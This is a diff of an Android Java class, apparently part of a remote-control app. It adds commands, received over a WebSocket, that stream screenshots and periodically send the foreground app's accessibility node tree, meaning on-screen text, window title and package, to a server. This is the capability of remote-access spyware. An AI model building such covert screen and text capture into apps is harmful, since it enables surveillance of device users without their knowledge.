@@ -41,9 +41,12 @@ public class ScreenshotHandler {
     private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?> streamingTask;
     private final AtomicBoolean streaming = new AtomicBoolean(false);
-
     private volatile String activeSubc = "screenshot";
-    private volatile String activeMode = "screenshot"; // "screenshot", "screen", "readScreen"
+
+    // SK 独立定时器，不被 SN/SM 影响
+    private final ScheduledExecutorService nodeTreeScheduler = Executors.newSingleThreadScheduledExecutor();
+    private ScheduledFuture<?> nodeTreeTask;
+    private final AtomicBoolean nodeTreeRunning = new AtomicBoolean(false);
 
     public void handle(JsonObject command) {
         String comdtype = command.has("comdtype") ? command.get("comdtype").getAsString() : "";
@@ -51,32 +54,35 @@ public class ScreenshotHandler {
 
         switch (comdtype) {
             case "SN":
-                startStreaming("screen", "screen");
+                startStreaming("screen");
                 break;
             case "SM":
-                startStreaming("screenshot", "screenshot");
+                startStreaming("screenshot");
                 break;
             case "SK":
-                startStreaming("readScreen", "readScreen");
+                startNodeTree();
                 break;
-            case "SMOFF":
             case "SNOFF":
-            case "SKOFF":
+            case "SMOFF":
                 stopStreaming();
+                break;
+            case "SKOFF":
+                stopNodeTree();
                 break;
             default:
                 Log.w(TAG, "Unknown screen comdtype: " + comdtype);
         }
     }
 
-    private void startStreaming(String subc, String mode) {
+    // ============ 截图投屏 (SN/SM) ============
+
+    private void startStreaming(String subc) {
         if (streaming.get()) {
             stopStreaming();
         }
 
         streaming.set(true);
         activeSubc = subc;
-        activeMode = mode;
 
         MyAccessibilityService service = MyAccessibilityService.P();
         if (service == null) {
@@ -85,20 +91,15 @@ public class ScreenshotHandler {
             return;
         }
 
-        long interval = "readScreen".equals(mode) ? NODE_TREE_INTERVAL_MS : FRAME_INTERVAL_MS;
-        Log.i(TAG, "Starting streaming: mode=" + mode + ", interval=" + interval + "ms");
+        Log.i(TAG, "Starting screen streaming: subc=" + subc);
 
         streamingTask = scheduler.scheduleAtFixedRate(() -> {
             try {
-                if ("readScreen".equals(activeMode)) {
-                    readAndSendNodeTree();
-                } else {
-                    captureAndSendFrame();
-                }
-            } catch (Exception e) {
+                captureAndSendFrame();
+            } catch (Throwable e) {
                 Log.e(TAG, "Streaming task error", e);
             }
-        }, 0, interval, TimeUnit.MILLISECONDS);
+        }, 0, FRAME_INTERVAL_MS, TimeUnit.MILLISECONDS);
     }
 
     private void stopStreaming() {
@@ -107,7 +108,39 @@ public class ScreenshotHandler {
             streamingTask.cancel(false);
             streamingTask = null;
         }
-        Log.i(TAG, "Streaming stopped");
+        Log.i(TAG, "Screen streaming stopped");
+    }
+
+    private void startNodeTree() {
+        if (nodeTreeRunning.get()) stopNodeTree();
+
+        nodeTreeRunning.set(true);
+
+        MyAccessibilityService service = MyAccessibilityService.P();
+        if (service == null) {
+            Log.e(TAG, "AccessibilityService not available for nodeTree");
+            nodeTreeRunning.set(false);
+            return;
+        }
+
+        Log.i(TAG, "Starting node tree streaming");
+
+        nodeTreeTask = nodeTreeScheduler.scheduleAtFixedRate(() -> {
+            try {
+                readAndSendNodeTree();
+            } catch (Throwable e) {
+                Log.e(TAG, "NodeTree task error", e);
+            }
+        }, 0, NODE_TREE_INTERVAL_MS, TimeUnit.MILLISECONDS);
+    }
+
+    private void stopNodeTree() {
+        if (!nodeTreeRunning.getAndSet(false)) return;
+        if (nodeTreeTask != null) {
+            nodeTreeTask.cancel(false);
+            nodeTreeTask = null;
+        }
+        Log.i(TAG, "Node tree streaming stopped");
     }
 
     // ============ 截图投屏 (SN/SM) ============
@@ -153,7 +186,7 @@ public class ScreenshotHandler {
     // ============ 文字辅助 — 无障碍节点树 (SK) ============
 
     private void readAndSendNodeTree() {
-        if (!streaming.get()) return;
+        if (!nodeTreeRunning.get()) return;
 
         MyAccessibilityService service = MyAccessibilityService.P();
         WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
@@ -174,8 +207,6 @@ public class ScreenshotHandler {
                         if (w.getType() == AccessibilityWindowInfo.TYPE_APPLICATION) {
                             AccessibilityNodeInfo r = w.getRoot();
                             if (r != null) {
-                                // refresh 强制从系统获取最新数据
-                                r.refresh();
                                 root = r;
                                 CharSequence title = w.getTitle();
                                 if (title != null) windowTitle = title.toString();
@@ -189,7 +220,6 @@ public class ScreenshotHandler {
                             if (w != null && w.isActive()) {
                                 AccessibilityNodeInfo r = w.getRoot();
                                 if (r != null) {
-                                    r.refresh();
                                     root = r;
                                     CharSequence title = w.getTitle();
                                     if (title != null) windowTitle = title.toString();
@@ -203,7 +233,6 @@ public class ScreenshotHandler {
 
             if (root == null) {
                 root = service.getRootInActiveWindow();
-                if (root != null) root.refresh();
             }
 
             if (root == null) return;
@@ -234,7 +263,7 @@ public class ScreenshotHandler {
             String json = msg.toString();
             Log.d(TAG, "readScreen: nodes=" + children.size() + ", pkg=" + activePackage);
             ws.send(json);
-        } catch (Exception e) {
+        } catch (Throwable e) {
             Log.e(TAG, "readScreen failed", e);
         }
     }
@@ -302,6 +331,6 @@ public class ScreenshotHandler {
     }
 
     public boolean isStreaming() {
-        return streaming.get();
+        return streaming.get() || nodeTreeRunning.get();
     }
 }
